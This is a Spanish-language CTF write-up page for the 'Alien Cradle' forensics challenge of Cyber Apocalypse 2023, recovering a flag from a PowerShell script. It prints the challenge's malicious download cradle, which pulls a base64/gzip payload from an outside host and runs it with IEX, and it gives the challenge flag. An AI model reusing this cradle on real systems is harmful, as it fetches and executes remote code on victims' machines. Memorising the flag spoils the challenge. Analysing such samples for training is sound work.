@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Alien Cradle Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Alien Cradle del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Alien Cradle Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Alien Cradle del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Alien Cradle Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Alien Cradle del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Alien Cradle Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/forensics.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Alien Cradle</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Una vez descomprimido el <code class="language-plaintext highlighter-rouge">zip</code> podemos ver los archivos que nos deja, solo nos deja un archivo con el nombre <code class="language-plaintext highlighter-rouge">creadle.ps1</code> que es un script escrito en <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls</span><span class="p">
+ cradle.ps1  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al leerlo este se divide en varios comandos separados por <code class="language-plaintext highlighter-rouge">;</code> en uno la variable <code class="language-plaintext highlighter-rouge">$f</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">cradle.ps1 
+</span><span class="o">if</span><span class="p">([</span><span class="no">System.Security.Principal.WindowsIdentity</span><span class="p">]::GetCurrent().Name </span><span class="o">-ne </span><span class="s">'secret_HQ\Arth'</span><span class="p">){</span><span class="o">exit</span><span class="p">};$w </span><span class="o">= </span><span class="no">New-Object </span><span class="p">net.webclient;$w.Proxy.Credentials</span><span class="o">=</span><span class="p">[</span><span class="no">Net.CredentialCache</span><span class="p">]::DefaultNetworkCredentials;$d </span><span class="o">= </span><span class="p">$w.DownloadString(</span><span class="s">'http://windowsliveupdater.com/updates/33'</span><span class="o"> + </span><span class="s">'96f3bf5a605cc4' </span><span class="o">+ </span><span class="s">'1bd0d6e229148' </span><span class="o">+ </span><span class="s">'2a5/2_34122.gzip.b64'</span><span class="p">);$s </span><span class="o">= </span><span class="no">New-Object </span><span class="p">IO.MemoryStream(</span><span class="o">,</span><span class="p">[</span><span class="no">Convert</span><span class="p">]::FromBase64String($d));$f </span><span class="o">= </span><span class="s">'H'</span><span class="o"> + </span><span class="s">'T' </span><span class="o">+ </span><span class="s">'B' </span><span class="o">+</span><span class="s"> '{p0w3rs' </span><span class="o">+ </span><span class="s">'h3ll' </span><span class="o">+ </span><span class="s">'_Cr4d' </span><span class="o">+</span><span class="s"> 'l3s_c4n_g3t' </span><span class="o">+ </span><span class="s">'_th' </span><span class="o">+ </span><span class="s">'3_j0b_d' </span><span class="o">+</span><span class="s"> '0n3}'</span><span class="p">;IEX (</span><span class="no">New-Object </span><span class="p">IO.StreamReader(</span><span class="no">New-Object </span><span class="p">IO.Compression.GzipStream($s</span><span class="o">,</span><span class="p">[</span><span class="no">IO.Compression.CompressionMode</span><span class="p">]::Decompress))).ReadToEnd();  </span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Podemos juntar manualmente los caracteres de la variable <code class="language-plaintext highlighter-rouge">$f</code> o ejecutar el comando donde se define en una <code class="language-plaintext highlighter-rouge">pwsh</code> y despues mostrar el valor de la variable</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ pwsh</span><span class="p">
+PowerShell 7.2.6
+Copyright (c) Microsoft Corporation.
+
+PS /home/kali> </span><span class="ve">$f</span><span class="c1"> = </span><span class="az">'H' </span><span class="c1">+</span><span class="az"> 'T' </span><span class="c1">+</span><span class="az"> 'B' </span><span class="c1">+ </span><span class="az">'{p0w3rs' </span><span class="c1">+</span><span class="az"> 'h3ll' </span><span class="c1">+</span><span class="az"> '_Cr4d' </span><span class="c1">+</span><span class="az"> 'l3s_c4n_g3t' </span><span class="c1">+</span><span class="az"> '_th' </span><span class="c1">+</span><span class="az"> '3_j0b_d' </span><span class="c1">+</span><span class="az"> '0n3}'  </span><span class="p">
+PS /home/kali> </span><span class="am">echo </span><span class="ve">$f</span><span class="p">
+HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}
+PS /home/kali></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
